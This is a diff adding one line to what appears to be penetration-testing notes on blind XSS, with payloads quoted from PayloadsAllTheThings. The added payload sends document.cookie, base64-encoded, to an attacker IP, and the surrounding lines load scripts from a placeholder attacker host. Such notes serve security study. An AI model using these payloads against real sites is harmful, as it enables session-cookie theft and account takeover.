@@ -87,6 +87,7 @@ If we get a request for /username, then we know that field is vulnerable
 
 Examples from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)
 ```html
+<img src=x onerror=fetch("http://10.10.14.xxx//"+btoa(document.cookie));>
 <script src=http://OUR_IP></script>
 '><script src=http://OUR_IP></script>
 "><script src=http://OUR_IP></script>
